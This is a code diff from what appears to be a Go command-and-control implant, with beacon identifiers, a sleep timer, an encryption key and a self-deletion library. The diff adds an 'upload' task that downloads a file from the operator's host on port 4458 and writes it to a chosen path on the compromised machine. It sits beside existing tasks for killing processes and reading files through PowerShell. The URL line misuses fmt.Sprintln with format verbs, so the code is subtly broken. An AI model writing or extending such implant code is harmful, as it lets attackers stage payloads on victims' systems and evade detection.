@@ -6,6 +6,7 @@ import (
 	"dingo/tasks"
 	"encoding/json"
 	"fmt"
+	"io"
 	"net/http"
 	"os"
 	"strings"
@@ -14,7 +15,7 @@ import (
 	selfdelete "github.com/secur30nly/go-self-delete"
 )
 
-func ExecTasks(tasksToDo []string, url string, sleep *int, agentid string, useragent string, key []byte, beacon_name string) {
+func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string, key []byte, beacon_name string, rhost string, url string) {
 	for _, task := range tasksToDo {
 		var data string
 
@@ -41,6 +42,37 @@ func ExecTasks(tasksToDo []string, url string, sleep *int, agentid string, usera
 			data = fmt.Sprintf("killed process (%s)", pid)
 		case "cat":
 			data, _ = hg.PsReturn("type " + taskData)
+		case "upload":
+			taskDataSplit := strings.Split(taskData, " ")
+			uFile := taskDataSplit[0]
+			dPath := taskDataSplit[1]
+
+			url := fmt.Sprintln("http://%s:4458/files/%s", rhost, uFile)
+
+			// get the data
+			resp, err := http.Get(url)
+			if err != nil {
+				data = err.Error()
+				break
+			}
+			defer resp.Body.Close()
+
+			// create the file
+			outFile, err := os.Create(dPath)
+			if err != nil {
+				data = err.Error()
+				break
+			}
+			defer outFile.Close()
+
+			// write the data to the file
+			_, err = io.Copy(outFile, resp.Body)
+			if err != nil {
+				data = err.Error()
+				break
+			}
+
+			data = "successfully uploaded file"
 		}
 
 		rawJsonData := tasks.HttpTaskPostRequest{
